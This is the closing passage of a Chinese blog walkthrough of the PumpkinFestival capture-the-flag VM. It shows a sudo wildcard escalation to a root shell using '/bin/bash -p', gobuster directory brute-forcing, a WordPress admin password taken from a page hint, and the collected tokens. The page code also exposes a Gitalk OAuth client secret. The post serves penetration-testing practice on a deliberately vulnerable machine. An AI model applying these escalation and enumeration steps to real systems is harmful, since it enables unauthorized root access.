class="hljs-built_in">cd</span> pumpkins/<br>jack@pumpkin:~/pumpkins$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/bin/bash -p&quot;</span> &gt;alohomora*<br>jack@pumpkin:~/pumpkins$ <span class="hljs-built_in">ls</span><br>alohomora*<br>jack@pumpkin:~/pumpkins$ sudo /home/jack/pumpkins/alohomora*<br>sudo: /home/jack/pumpkins/alohomora*: <span class="hljs-built_in">command</span> not found<br>jack@pumpkin:~/pumpkins$ <span class="hljs-built_in">chmod</span> +x alohomora\* <br>jack@pumpkin:~/pumpkins$ sudo /home/jack/pumpkins/alohomora*<br>root@pumpkin:~/pumpkins<span class="hljs-comment"># cd /root</span><br>root@pumpkin:/root<span class="hljs-comment"># ls</span><br>PumpkinFestival_Ticket<br>root@pumpkin:/root<span class="hljs-comment"># ls -alih</span><br>total 36K<br>131254 drwx------  3 root root 4.0K Jul 16  2019 .<br>     2 drwxr-xr-x 22 root root 4.0K Jul 12  2019 ..<br>169504 -rw-r--r--  1 root root   55 Jul 15  2019 .bash_logout<br>131227 -rw-r--r--  1 root root 3.1K Feb 20  2014 .bashrc<br> 21326 drwx------  2 root root 4.0K Jul 12  2019 .cache<br>131282 -rw-------  1 root root  369 Jul 13  2019 .mysql_history<br>171922 -rw-------  1 root root   89 Jul 16  2019 .nano_history<br>131226 -rw-r--r--  1 root root  140 Feb 20  2014 .profile<br>131259 -rw-r--r--  1 root root 1.7K Jul 15  2019 PumpkinFestival_Ticket<br>root@pumpkin:/root<span class="hljs-comment"># cat PumpkinFestival_Ticket</span><br>------------------------------------------------------------<br>                        Yippeeeee!<br>  Congratulations on successfully rooting this machine.<br><br>                          ooo<br>                         $ o$<br>                        o $$<br>              <span class="hljs-string">&quot;&quot;</span>$$$    o<span class="hljs-string">&quot; $$ oo &quot;</span><br>          <span class="hljs-string">&quot; o$&quot;</span>$oo$$$<span class="hljs-string">&quot;o$$o$$&quot;</span>$$$$$ o<br>         $<span class="hljs-string">&quot; &quot;</span>o$$$$$$o$$$$$$$$$$$$$<span class="hljs-variable">$o</span>     o<br>      o$<span class="hljs-string">&quot;    &quot;</span>$$$$$$$$$$$$$$$$$$$$$<span class="hljs-variable">$o</span><span class="hljs-string">&quot; &quot;</span>oo  o<br>     <span class="hljs-string">&quot; &quot;</span>     o  <span class="hljs-string">&quot;$$<span class="hljs-variable">$o</span>   o$$$$$$$$$$$oo$$</span><br><span class="hljs-string">    &quot;</span> $     <span class="hljs-string">&quot; &quot;</span>o$$$$$ $$$$$$$$$$$<span class="hljs-string">&quot;$$$$$$<span class="hljs-variable">$o</span></span><br><span class="hljs-string">  o  $       o o$$$$$&quot;</span>$$$$$$$$$$$o$$<span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;$$$<span class="hljs-variable">$o</span> &quot;</span> <span class="hljs-string">&quot;</span><br><span class="hljs-string"> o          o$$$$$&quot;</span>    <span class="hljs-string">&quot;$$$$$$$$$$ &quot;</span><span class="hljs-string">&quot; oo $$   o $</span><br><span class="hljs-string"> $  $       $$$$$  $$<span class="hljs-variable">$oo</span> &quot;</span>$$$$$$$<span class="hljs-variable">$o</span> o $$$o$<span class="hljs-variable">$oo</span> o o<br>o        o $$$$$oo$$$$$$o$$$$ <span class="hljs-string">&quot;&quot;</span>$$oo$$$$$$$$<span class="hljs-string">&quot;  &quot;</span> <span class="hljs-string">&quot;o</span><br><span class="hljs-string">&quot;</span>   o    $ <span class="hljs-string">&quot;&quot;</span>$$$$$$$$$$$$$$  o  <span class="hljs-string">&quot;$$$$$$$$$$$$   o &quot;</span><br><span class="hljs-string">&quot;   $      &quot;</span>$$$$$$$$$$$$$$   <span class="hljs-string">&quot;   $$$&quot;</span>$$$$$$$<span class="hljs-variable">$o</span>  o<br>$   o      o$<span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;$$$$$$$$    oooo$$ $$$$$$$$&quot;</span>  <span class="hljs-string">&quot;</span><br><span class="hljs-string">$      o&quot;</span><span class="hljs-string">&quot;o $<span class="hljs-variable">$o</span>    $$$$$$$$$$$$$$$$$ &quot;</span><span class="hljs-string">&quot;  o$$$   $ o</span><br><span class="hljs-string"> o     &quot;</span> <span class="hljs-string">&quot;o &quot;</span>$$$$  $$$$$<span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot; $  o$$$$$&quot;</span><span class="hljs-string">&quot; o o</span><br><span class="hljs-string"> &quot;</span>  <span class="hljs-string">&quot; o  o<span class="hljs-variable">$o</span>&quot;</span> $$$<span class="hljs-variable">$o</span>   <span class="hljs-string">&quot;&quot;</span>           o  o$$$$$<span class="hljs-string">&quot;   o</span><br><span class="hljs-string">  $         o$$$$$$<span class="hljs-variable">$oo</span>            &quot;</span>oo$$$$$$$<span class="hljs-string">&quot;    o</span><br><span class="hljs-string">  &quot;</span>$   o o<span class="hljs-variable">$o</span> <span class="hljs-variable">$o</span> o$$$$$<span class="hljs-string">&quot;$$$$oooo$$$$$$$$$$$$$$&quot;</span>o<span class="hljs-variable">$o</span><br>    <span class="hljs-string">&quot;o oo  $o$&quot;</span>oo$$$$$o$$$$$$$$$$$$<span class="hljs-string">&quot;$$$$$$$$&quot;</span>o$<span class="hljs-string">&quot;</span><br><span class="hljs-string">     &quot;</span><span class="hljs-variable">$ooo</span> $$o$   $$$$$$$$$$$$$$$$ $$$$$$$<span class="hljs-variable">$o</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">        &quot;</span><span class="hljs-string">&quot; $$$$$$$$$$$$$$$$$$$$$$&quot;</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;&quot;</span><br>                         <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;&quot;</span><br>      There were 10 PumpkinTokens on this VM<br><br>------------------------------------------------------------<br>    Love to know your thoughts and suggestions<br>              Tweet me @askjayanth<br>------------------------------------------------------------<br>     <br>  Eagerly waiting to see your detailed walk-throughs<br>            Level 1 : PumpkinGarden<br>            Level 2 : PumpkinRaising<br>            Level 3 : PumpkinFestival<br><br>  Until next time, Mission-Pumpkin v1.0 signing off...<br><br><br>root@pumpkin:/root<span class="hljs-comment"># ip a</span><br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default <br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 08:00:27:fa:92:8e brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.140/24 brd 192.168.56.255 scope global eth0<br>       valid_lft forever preferred_lft forever<br>    inet6 fe80::a00:27ff:fefa:928e/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>root@pumpkin:/root<span class="hljs-comment"># uname -a</span><br>Linux pumpkin 3.13.0-170-generic <span class="hljs-comment">#220-Ubuntu SMP Thu May 9 12:40:49 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span><br>root@pumpkin:/root<span class="hljs-comment"># whoami</span><br>root<br></code></pre></td></tr></table></figure>
+
+<p>提权成功，拿到了 flag</p>
+<p>不过这里提示说一共有十个PumpkinToken</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">jack@pumpkin:~$ <span class="hljs-built_in">ls</span> -liah<br>total 52K<br> 21273 drwx------ 5 jack jack 4.0K Sep 12 13:40 .<br>  8199 drwxr-xr-x 5 root root 4.0K Jul 12  2019 ..<br> 23336 -rw------- 1 root root   74 Sep 12 13:40 .bash_history<br> 21276 -rw-r--r-- 1 jack jack  231 Jul 15  2019 .bash_logout<br> 21285 -rw------- 1 root root   94 Jul 16  2019 .bash_profile<br> 21275 -rw-r--r-- 1 jack jack 3.6K Jul 15  2019 .bashrc<br> 21319 drwx------ 2 jack jack 4.0K Jul 12  2019 .cache<br> 21274 -rw-r--r-- 1 jack jack  675 Jul 12  2019 .profile<br> 23207 drwxrwxr-x 2 jack jack 4.0K Sep 12 13:34 pumpkins<br> 22986 drwxrwxr-x 2 jack jack 4.0K Jul 12  2019 .ssh<br>175806 -rwsr-xr-x 1 root root  11K Jul 15  2019 token<br>jack@pumpkin:~$ file token<br>token: setuid ELF 64-bit LSB  executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), <span class="hljs-keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=977c5f4023cb5e77599fd8194089aa03f155ad88, stripped<br>jack@pumpkin:~$ ./token<br> <br>PumpkinToken : 8d66ef0055b43d80c34917ec6c75f706<br><span class="hljs-comment"># 第八个PumpkinToken</span><br></code></pre></td></tr></table></figure>
+
+<p>还有一个是在 &#x2F;tokens&#x2F; 目录下，还记得吗，在使用 IP 访问的时候，robots.txt 中给了几个目录，而 <code>/tokens/</code> 目录直接访问得到的结果是 403，但是这个目录爆破还可以得到一个文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/PumpkinFestival]<br>└─$ sudo gobuster <span class="hljs-built_in">dir</span> -u http://192.168.56.140/tokens/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html<br>===============================================================<br>Gobuster v3.5<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.56.140/tokens/<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.5<br>[+] Extensions:              html,txt<br>[+] Timeout:                 10s<br>===============================================================<br>2023/09/11 08:07:22 Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/.html                (Status: 403) [Size: 293]<br>/token.txt            (Status: 200) [Size: 48]<br>/.html                (Status: 403) [Size: 293]<br>Progress: 659599 / 661683 (99.69%)<br>===============================================================<br>2023/09/11 08:08:57 Finished<br>===============================================================<br></code></pre></td></tr></table></figure>
+
+<p>访问拿到了第九个PumpkinToken</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">PumpkinToken : 2c0e11d2200e2604587c331f02a7ebea<br><span class="hljs-comment"># 第九个PumpkinToken</span><br></code></pre></td></tr></table></figure>
+
+<p>最后一个藏在了 wordpress 的 admin 用户界面中，其正在编辑的 post 中藏着最后一个。而 admin 的密码，恰恰就是我们以 IP 访问时，最下面的 <code>Alohomora!</code> 当时搜了一下，这是哈利波特里开门的咒语，我没忘密码上去想，即使它是加粗了的字。</p>
+<p><img src="/pic/b2494b14630868f46bec3ef7e4a9c95f_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">PumpkinToken</span><span class="hljs-punctuation"> :</span> <span class="hljs-string">f2e00edc353309b40e1aed18e18ab2c4</span><br><span class="hljs-comment"># 第十个PumpkinToken</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这台靶机虽然在某些方面有一丢丢坑（没错，爆破说的就是你）。可是总体上我的收获也很多，最近打靶机的频率下降了，这台靶机在渗透思路和一些细节的把握上对我是一次惊醒——要把有限的精力放在拿到的信息上，如何有效利用已有的信息，并且完善渗透的细节，都是需要继续加油的地方。关于那一串字符串如何解，我的思路明显过于局限了，只考虑了密码，没有往编码的方向去想；关于首页中，加粗的哈利波特中开门咒语，也没忘密码方向去向；目录爆破的时候对于 403 的目录直接不管不顾，没有进一步尝试。这都是宝贵的提醒与经验</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/knowledge-database/" class="category-chain-item">knowledge_database</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>PumpkinFestival 靶机</div>
+      <div>https://i3eg1nner.github.io/2023/09/5c91d82f7083.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>I3eg1nner</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年9月10日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/09/d2dde49f3be2.html" title="代码审计day1">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">代码审计day1</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/09/1016a340d8b7.html" title="sahu 靶机">
+                        <span class="hidden-mobile">sahu 靶机</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="gitalk-container"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#gitalk-container', function() {
+      Fluid.utils.createCssLink('/css/gitalk.css')
+      Fluid.utils.createScript('https://lib.baomitu.com/gitalk/1.8.0/gitalk.min.js', function() {
+        var options = Object.assign(
+          {"clientID":"a14e9a13405642f51885","clientSecret":"5662f466deab58fdbbacd0ae3718eaf1625401dd","repo":"gitalk","owner":"I3eg1nner","admin":["I3eg1nner"],"language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token"},
+          {
+            id: '6dab2964f7c79cac372300f808c64744'
+          }
+        )
+        var gitalk = new Gitalk(options);
+        gitalk.render('gitalk-container');
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
